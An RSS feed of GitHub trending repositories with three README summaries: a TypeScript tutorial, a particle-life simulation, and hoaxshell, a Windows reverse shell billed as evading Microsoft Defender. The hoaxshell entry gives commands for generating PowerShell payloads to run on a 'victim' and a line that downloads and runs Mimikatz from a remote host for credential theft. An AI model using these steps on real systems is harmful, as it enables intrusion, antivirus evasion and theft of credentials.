<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub All Languages Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-28T01:33:08Z</updated>
  <subtitle>Daily Trending of All Languages in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>t3l3machus/hoaxshell</title>
    <updated>2022-08-28T01:33:08Z</updated>
    <id>tag:github.com,2022-08-28:/t3l3machus/hoaxshell</id>
    <link href="https://github.com/t3l3machus/hoaxshell" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;hoaxshell&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.python.org/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/python-3.x-yellow.svg?sanitize=true&#34; alt=&#34;Python 3.x&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/powershell-%E2%89%A5%20v3.0-blue&#34;&gt; &lt;a href=&#34;https://github.com/t3l3machus/hoaxshell/raw/main/LICENSE.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-BSD-red.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/Maintained%3F-Yes-96c40f&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Purpose&lt;/h2&gt; &#xA;&lt;p&gt;hoaxshell is an unconventional Windows reverse shell, currently undetected by Microsoft Defender and possibly other AV solutions as it is solely based on http(s) traffic. The tool is easy to use, it generates it&#39;s own PowerShell payload and it supports encryption (ssl).&lt;/p&gt; &#xA;&lt;p&gt;So far, it has been tested on fully updated &lt;strong&gt;Windows 11 Enterprise&lt;/strong&gt; and &lt;strong&gt;Windows 10 Pro&lt;/strong&gt; boxes (see video and screenshots).&lt;/p&gt; &#xA;&lt;h3&gt;Video Presentation&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=SEufgD5UxdU&#34;&gt;https://www.youtube.com/watch?v=SEufgD5UxdU&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Screenshots&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.github.com/t3l3machus/hoaxshell/master/screenshots/hoaxshell-win11-v2.png&#34; alt=&#34;usage_example_png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Find more screenshots &lt;a href=&#34;https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/screenshots/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/t3l3machus/hoaxshell&#xA;cd ./hoaxshell&#xA;sudo pip3 install -r requirements.txt&#xA;chmod +x hoaxshell.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: As a means of avoiding detection, hoaxshell is automatically generating random values for the session id, URL paths and name of a custom http header utilized in the process, every time the script is started. The generated payload will work only for the instance it was generated for. Use the &lt;code&gt;-g&lt;/code&gt; option to bypass this behaviour and re-establish an active session or reuse a past generated payload with a new instance of hoaxshell.&lt;/p&gt; &#xA;&lt;h4&gt;Basic shell session over http&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the &#34;rawpayload&#34; prompt command or start hoaxshell with the &lt;code&gt;-r&lt;/code&gt; argument. After the payload has been executed on the victim, you&#39;ll be able to run PowerShell commands against it.&lt;/p&gt; &#xA;&lt;h4&gt;Encrypted shell session (https):&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Generate self-signed certificate:&#xA;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365&#xA;&#xA;# Pass the cert.pem and key.pem as arguments:&#xA;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -c &amp;lt;/path/to/cert.pem&amp;gt; -k &amp;lt;path/to/key.pem&amp;gt;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The generated PowerShell payload will be longer in length because of an additional block of code that disables the ssl certificate validation.&lt;/p&gt; &#xA;&lt;h4&gt;Grab session mode&lt;/h4&gt; &#xA;&lt;p&gt;In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -g&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).&lt;/p&gt; &#xA;&lt;h2&gt;Limitations&lt;/h2&gt; &#xA;&lt;p&gt;The shell is going to hang if you execute a command that initiates an interactive session. Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# this command will execute succesfully and you will have no problem: &#xA;&amp;gt; powershell echo &#39;This is a test&#39;&#xA;&#xA;# But this one will open an interactive session within the hoaxshell session and is going to cause the shell to hang:&#xA;&amp;gt; powershell&#xA;&#xA;# In the same manner, you won&#39;t have a problem executing this:&#xA;&amp;gt; cmd /c dir /a&#xA;&#xA;# But this will cause your hoaxshell to hang:&#xA;&amp;gt; cmd.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So, if you for example would like to run mimikatz throught hoaxshell you would need to invoke the commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;hoaxshell &amp;gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.13:4443/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Command &#39;&#34;PRIVILEGE::Debug&#34;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.&lt;/p&gt; &#xA;&lt;h2&gt;Future&lt;/h2&gt; &#xA;&lt;p&gt;I am currently working on some auxiliary-type prompt commands to automate parts of host enumeration.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>total-typescript/beginners-typescript-tutorial</title>
    <updated>2022-08-28T01:33:08Z</updated>
    <id>tag:github.com,2022-08-28:/total-typescript/beginners-typescript-tutorial</id>
    <link href="https://github.com/total-typescript/beginners-typescript-tutorial" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An interactive TypeScript tutorial for beginners&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://totaltypescript.com&#34;&gt;&lt;img src=&#34;https://raw.githubusercontent.com/total-typescript/beginners-typescript-tutorial/main/og-image.png&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Quickstart&lt;/h2&gt; &#xA;&lt;p&gt;Clone this repo or &lt;a href=&#34;https://gitpod.io/#https://github.com/total-typescript/beginners-typescript&#34;&gt;open in Gitpod&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Installs all dependencies&#xA;yarn install&#xA;&#xA;# Starts the first exercise&#xA;yarn exercise 01&#xA;&#xA;# Runs linting and tests on the solution&#xA;yarn solution 01&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Video Walkthrough&lt;/h2&gt; &#xA;&lt;p&gt;I walked through the first few exercises on &lt;a href=&#34;https://www.youtube.com/watch?v=p6dO9u0M7MQ&#34;&gt;VSCode&#39;s live stream&lt;/a&gt;! The plan for these exercises is to develop them into a full workshop, and then bundle them into the full video course - &lt;a href=&#34;https://totaltypescript.com&#34;&gt;Total TypeScript&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;How to take the course&lt;/h2&gt; &#xA;&lt;p&gt;You&#39;ll notice that the course is split into exercises. Each exercise is split into a &lt;code&gt;*.problem.ts&lt;/code&gt; and a &lt;code&gt;*.solution.ts&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;To take an exercise:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Go into &lt;code&gt;*.problem.ts&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;yarn exercise 01&lt;/code&gt;, where &lt;code&gt;01&lt;/code&gt; is the number of the exercise you&#39;re on.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;The &lt;code&gt;exercise&lt;/code&gt; script will run TypeScript typechecks and a test suite on the exercise.&lt;/p&gt; &#xA;&lt;p&gt;This course encourages &lt;strong&gt;active, exploratory learning&lt;/strong&gt;. In the video, I&#39;ll explain a problem, and &lt;strong&gt;you&#39;ll be asked to try to find a solution&lt;/strong&gt;. To attempt a solution, you&#39;ll need to:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Check out &lt;a href=&#34;https://www.typescriptlang.org/docs/handbook/intro.html&#34;&gt;TypeScript&#39;s docs&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Try to find something that looks relevant.&lt;/li&gt; &#xA; &lt;li&gt;Give it a go to see if it solves the problem.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;You&#39;ll know if you&#39;ve succeeded because the tests will pass.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;If you succeed&lt;/strong&gt;, or &lt;strong&gt;if you get stuck&lt;/strong&gt;, unpause the video and check out the &lt;code&gt;*.solution.ts&lt;/code&gt;. You can see if your solution is better or worse than mine!&lt;/p&gt; &#xA;&lt;p&gt;You can run &lt;code&gt;yarn solution 01&lt;/code&gt; to run the tests and typechecking on the solution.&lt;/p&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;p&gt;Say thanks to Matt on &lt;a href=&#34;https://twitter.com/mattpocockuk&#34;&gt;Twitter&lt;/a&gt; or by joining his &lt;a href=&#34;https://discord.gg/8S5ujhfTB3&#34;&gt;Discord&lt;/a&gt;. Consider signing up to his &lt;a href=&#34;https://totaltypescript.com&#34;&gt;Total TypeScript course&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Reference&lt;/h2&gt; &#xA;&lt;h3&gt;&lt;code&gt;yarn exercise 01&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Alias: &lt;code&gt;yarn e 01&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Run the corresponding &lt;code&gt;*.problem.ts&lt;/code&gt; file.&lt;/p&gt; &#xA;&lt;h3&gt;&lt;code&gt;yarn solution 01&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Alias: &lt;code&gt;yarn s 01&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;Run the corresponding &lt;code&gt;*.solution.ts&lt;/code&gt; file. If there are multiple, it runs only the first one.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>hunar4321/life_code</title>
    <updated>2022-08-28T01:33:08Z</updated>
    <id>tag:github.com,2022-08-28:/hunar4321/life_code</id>
    <link href="https://github.com/hunar4321/life_code" rel="alternate"></link>
    <summary type="html">&lt;p&gt;A simple program to simulate attraction/reuplsion forces between many particles&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;img src=&#34;https://img.shields.io/github/repo-size/hunar4321/life_code&#34; alt=&#34;GitHub repo size&#34;&gt; &lt;img src=&#34;https://img.shields.io/github/license/hunar4321/life_code&#34; alt=&#34;GitHub&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Particle Life Simulation&lt;/h1&gt; &#xA;&lt;p&gt;A simple program to simulate primitive Artificial Life using simple rules of attraction/repulsion among atom like particles, producing complex self-organzing life like patterns as a result. The code is less than a page (excluding GUI elements). Video tutorial and Walkthrough is available below.&lt;/p&gt; &#xA;&lt;h2&gt;Learn More Here (YouTube video tutorial):&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/0Kx4Y9TVMGg&#34;&gt;https://youtu.be/0Kx4Y9TVMGg&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Interface&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hunar4321/life_code/main/images/interface.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Example Results&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hunar4321/life_code/main/images/big_pic.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Some Interesting Patterns to Reproduce:&lt;/h2&gt; &#xA;&lt;p&gt;You don&#39;t need to be exact with the parameters to reproduce these patterns. The best way to get interesting patterns: First try random parameter explorations, once you find an intersting pattern, try fine-tuning it gradually. To avoid being stuck at a local maximum, you can make some occasional big parameter jumps. This way interesting &amp;amp; different patterns keep poping up.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/hunar4321/life_code/main/images/some_patterns.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;To use:&lt;/h2&gt; &#xA;&lt;p&gt;Download this repo. unzip the file then go to /particle_life/bin/ folder and click on particle_life.exe&lt;/p&gt; &#xA;&lt;h2&gt;Code:&lt;/h2&gt; &#xA;&lt;p&gt;Source code available in both C++ and JavaScript ( watch this YouTube video for a walkthrough tutorial: &lt;a href=&#34;https://youtu.be/0Kx4Y9TVMGg&#34;&gt;https://youtu.be/0Kx4Y9TVMGg&lt;/a&gt; )&lt;/p&gt; &#xA;&lt;p&gt;If you like to contribute to the C++ program. The core algorithm is the first 100 lines of code at: &#34;/particle_life/src/ofApp.cpp&#34;. Everything else are GUI components &amp;amp; rendering controls which are provided by the openFrameworks library. openFrameworks is a nice, opensource, and easy to use image rendering library. To start, download this repository first, then download openFrameworks library here (&lt;a href=&#34;https://openframeworks.cc/&#34;&gt;https://openframeworks.cc/&lt;/a&gt;). Use openFramework&#39;s projectGenerator and import /particle_life/ folder to the project. Alternatively, generate a new openFramework project and add ofxGui. Once the project files are generated replace the /src/ folder with the one provided here. You can now compile the C++ code on your machine.&lt;/p&gt; &#xA;&lt;h2&gt;Todos (If I have time):&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Adding the ability to save and load parameters (so that people can easily share the interesting models they find)&lt;/li&gt; &#xA; &lt;li&gt;Ability to add more particle types (currently it&#39;s fixed to four particle types)&lt;/li&gt; &#xA; &lt;li&gt;Currently, the biggest bottle neck is the nested for-loops (which calculates the pairwise distance among all particles) making the computational complexity quadratic. It will be amazing if we could find a way around this bottle neck.&lt;/li&gt; &#xA; &lt;li&gt;Alternative to point 3, computing the pairwise distances are embarrassingly parallel so it can be computed on GPU.&lt;/li&gt; &#xA; &lt;li&gt;Adding the ability to resize the screen &amp;amp; improving the bound checking as many fast moving particles can escape the screen bounds.&lt;/li&gt; &#xA; &lt;li&gt;Adding a more intuitive UI so that it gives the ability for a finer control over the parameters.&lt;/li&gt; &#xA; &lt;li&gt;Adding a randomize button or even better having a simple meta rule to mutate the initial rule continously &amp;amp; recursively, this way the patterns will never stuck on a local maximum and will keep changing!&lt;/li&gt; &#xA; &lt;li&gt;A better way to fine-tune is to use an evolutionary algorithm to select and optimize the parameters but one needs to write a fitness function for that. I currently don&#39;t know what fitness function corresponds to in the realm of this program. In our world the fitness function is competition &amp;amp; survival of the fittest. However, here we fine-tune and select the parameters that produces interesting patterns for us, however, the word &#34;interesting&#34; here is easier to say than to define!&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;The JavaScript code is as simple as this:&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;  &amp;lt;canvas id=&#34;life&#34; width=&#34;500&#34; height=&#34;500&#34;&amp;gt;&amp;lt;/canvas&amp;gt;&#xA;  &amp;lt;script&amp;gt;&#xA;    //Hunar Ahmad @ brainxyz&#xA;  m=document.getElementById(&#34;life&#34;).getContext(&#39;2d&#39;)&#xA;  draw=(x,y,c,s)=&amp;gt;{m.fillStyle=c; m.fillRect(x, y, s, s)}&#xA;  atoms=[]&#xA;  atom=(x,y,c)=&amp;gt;{return{&#34;x&#34;:x, &#34;y&#34;:y, &#34;vx&#34;:0, &#34;vy&#34;:0, &#34;color&#34;:c}}&#xA;  random=()=&amp;gt;{return Math.random()*400+50}&#xA;  create=(number, color)=&amp;gt;{ &#xA;  &#x9;group=[]&#xA;    for(let i=0; i &amp;lt; number; i++){&#xA;&#x9;    group.push(atom(random(), random(), color))&#xA;&#x9;    atoms.push(group[i]) &#xA;&#x9;}&#xA;    return group &#xA;  }&#xA;  rule=(atoms1, atoms2, g)=&amp;gt;{&#xA;  for(let i=0; i &amp;lt; atoms1.length; i++){&#xA;    fx = 0&#xA;    fy = 0&#xA;    for(let j=0; j &amp;lt; atoms2.length; j++){&#xA;      a = atoms1[i]&#xA;      b = atoms2[j]&#xA;      dx = a.x-b.x&#xA;      dy = a.y-b.y&#xA;      d = Math.sqrt(dx*dx + dy*dy)&#xA;      if(d &amp;gt; 0 &amp;amp;&amp;amp; d &amp;lt; 80){&#xA;      &#x9;F = g * 1/d&#xA;        fx += (F * dx)&#xA;        fy += (F * dy)&#xA;      }&#xA;    } &#xA;    a.vx = (a.vx + fx)*0.5&#xA;    a.vy = (a.vy + fy)*0.5&#xA;    a.x += a.vx&#xA;    a.y += a.vy&#xA;    if(a.x &amp;lt;= 0 || a.x &amp;gt;= 500){ a.vx *=-1 }&#xA;    if(a.y &amp;lt;= 0 || a.y &amp;gt;= 500){ a.vy *=-1 }&#xA;    }&#xA;  }&#xA;  yellow = create(200, &#34;yellow&#34;)&#xA;  red = create(200, &#34;red&#34;)&#xA;  green = create(200, &#34;green&#34;)&#xA;  update=()=&amp;gt;{&#xA;    rule(green, green, -0.32)&#xA;    rule(green, red, -0.17)&#xA;    rule(green, yellow, 0.34)&#xA;    rule(red, red, -0.10)&#xA;    rule(red, green, -0.34)&#xA;    rule(yellow, yellow, 0.15)&#xA;    rule(yellow, green, -0.20)&#xA;    m.clearRect(0, 0, 500, 500)&#xA;    draw(0, 0, &#34;black&#34;, 500)&#xA;    for(i=0; i&amp;lt;atoms.length; i++){ &#xA;    draw(atoms[i].x, atoms[i].y, atoms[i].color, 5) &#xA;    }&#xA;    requestAnimationFrame(update)&#xA;  }&#xA;  update();&#xA;  &amp;lt;/script&amp;gt;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;br&gt; &#xA;&lt;p&gt;Related topics: Particle Life Simulation, Primordial Soup - Evolution, Conway&#39;s game of life, Cellular automata, Self organzing patterns,&lt;/p&gt; &#xA;&lt;p&gt;This project was inspired by: Jeffery Ventrella&#39;s Clusters &lt;a href=&#34;http://www.ventrella.com/Clusters/&#34;&gt;http://www.ventrella.com/Clusters/&lt;/a&gt; I don&#39;t have access to Ventrella&#39;s code but I guess the main difference of this project with the other particle life projects is that I didn&#39;t implement collision detection and this made simulating thousands of particles possible in real-time. Also, I added GUI controls to change the parameters in real-time this allows easy fine-tuning &amp;amp; exploration, hence, I was able to find some never-seen-before patterns emerge form some extremely simple models of relations. The code here is probably an order of magnitude simpler than any other Artificial Life codes out there because I started this code solely as an educational material for non-programmers and general audience to prove the point that complexity can arise from simplicity.&lt;/p&gt;</summary>
  </entry>
</feed>